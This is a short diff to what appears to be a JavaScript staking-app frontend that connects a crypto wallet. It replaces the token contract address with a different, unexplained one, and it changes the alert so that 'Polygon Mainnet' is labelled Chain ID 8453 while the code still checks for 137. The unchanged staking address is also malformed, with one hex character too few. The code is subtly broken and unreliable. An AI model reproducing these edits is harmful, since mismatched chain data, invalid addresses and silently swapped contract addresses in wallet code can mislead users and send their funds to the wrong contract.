@@ -4,7 +4,7 @@ let provider,
   tokenContract,
   stakingContract,
   aethPrice = 487e-6;
-const TOKEN_ADDRESS = '0xAb5ae0D8f569d7c2B27574319b864a5bA6F9671e',
+const TOKEN_ADDRESS = '0xecf7E17faE148C01E1b5008A31Dfd2d1B6608E4e',
   STAKING_ADDRESS = '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb',
   TOKEN_ABI = [
     'function balanceOf(address owner) view returns (uint256)',
@@ -27,7 +27,7 @@ async function connectWallet() {
     signer = provider.getSigner();
     userAddress = await signer.getAddress();
     if ((await provider.getNetwork()).chainId !== 137) {
-      alert('Please switch to Polygon Mainnet (Chain ID: 137)');
+      alert('Please switch to Polygon Mainnet (Chain ID: 8453)');
       try {
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
